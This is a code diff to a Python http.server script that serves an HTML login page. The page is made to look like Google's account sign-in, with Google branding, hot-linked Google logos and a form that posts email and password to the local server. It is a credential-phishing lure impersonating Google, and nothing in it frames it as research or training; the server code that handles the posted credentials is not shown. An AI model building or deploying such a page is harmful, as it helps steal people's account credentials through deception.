@@ -2,99 +2,100 @@ import http.server
 import socketserver
 import urllib.parse
 
-# Definindo a porta em que o servidor irá rodar
+# Port where the server will run
 PORT = 8080
 
-# Definindo o conteúdo HTML da página com a nova imagem e o formulário de login
+# HTML content for the login page
 html_content = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Page</title>
+<!-- Favicon -->
+   <link rel="icon" type="image/x-icon" href="https://img1.gratispng.com/20180412/oje/kisspng-google-logo-google-search-advertising-google-5acf6362e55785.2911993015235408349394.jpg">  
+<center>
+    <title>One account. All of Google.</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
+            background: #fff;
+           
+            justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f2f2f2;
-        }
-        .image-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .image-container img#google-logo {
-            width: 150px; /* Largura ajustada */
-            height: 50px; /* Altura ajustada */
         }
         .login-container {
-            background-color: white;
+            width: 400px;
             padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            width: 300px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
             text-align: center;
         }
-        .login-container h3 {
+        img#google-logo {
+            height: 40px; /* Altura reduzida */
             margin-bottom: 20px;
         }
-        .login-container input[type="text"],
-        .login-container input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid #ddd;
-            box-sizing: border-box;
+        img#avatar {
+            width: 100px; /* Largura ajustada */
+            height: 100px; /* Altura ajustada */
+            border-radius: 50%; /* Arredonda a imagem */
+            margin-bottom: 10px;
         }
-        .login-container button {
-            width: 100%;
-            padding: 10px;
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input {
+            height: 40px;
+            margin-bottom: 10px;
+            padding: 0 10px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            height: 40px;
             background-color: #4285f4;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
+            font-size: 16px;
             cursor: pointer;
         }
-        .login-container img {
-            border-radius: 50%; /* Arredonda a imagem */
-            width: 100px; /* Largura ajustada */
-            height: 100px; /* Altura ajustada */
-            object-fit: cover; /* Ajusta o conteúdo da imagem */
+        .footer {
+            font-size: 12px;
+            margin-top: 20px;
         }
-        .login-container #google-logo-footer {
-            width: 200px; /* Largura ajustada */
-            height: 100px; /* Altura ajustada */
-            object-fit: contain; /* Mantém a proporção da imagem sem cortar */
-            margin-bottom: 10px; /* Espaço abaixo da imagem */
+        img#logo-accounts {
+            height: 20px; /* Altura ajustada para diminuir */
         }
-        .login-container h5 {
-            margin-bottom: 10px; /* Espaço abaixo do texto */
-            font-size: 14px; /* Ajusta o tamanho da fonte se necessário */
-            color: #555; /* Ajusta a cor do texto se necessário */
+        h5 {
+            font-size: 15px;
+            color: #757575; /* Cor cinza */
         }
     </style>
 </head>
 <body>
-    <div class="image-container">
-        <h1>
-            <img id="google-logo" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" alt="Logotipo do Google">
-            <h3>Sign in with your Google Account</h3>
-        </h1>
-    </div>
     <div class="login-container">
-        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Login Image">
+        <img id="google-logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+        <h1 style="font-size: 24px;">Sign in with your Google Account</h1>
+        <h5>Sign in to Gmail account</h5>
+        <img id="avatar" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Login Image">
         <form method="post" action="/">
             <input type="text" name="email" placeholder="Email" required>
             <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Entrar</button>
-            
-            <h5>One Google Account for everything Google</h5>
-            <img id="google-logo-footer" src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" alt="Logotipo do Google">
+            <button type="submit">Sign in</button>
         </form>
+        <img id="google-logo" src="https://www.ufpb.br/ccau/contents/imagens/home/branco.png/@@images/image.png" alt="Google">
+        <h1 style="font-size: 24px;"> </h1>
+        <div class="footer">        
+           
+            <h5>One Google Account for everything Google</h5>
+            
+            <img id="logo-accounts" src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" alt="Logotipo do Google">
+        </div>
     </div>
+    </center>
 </body>
 </html>
 """
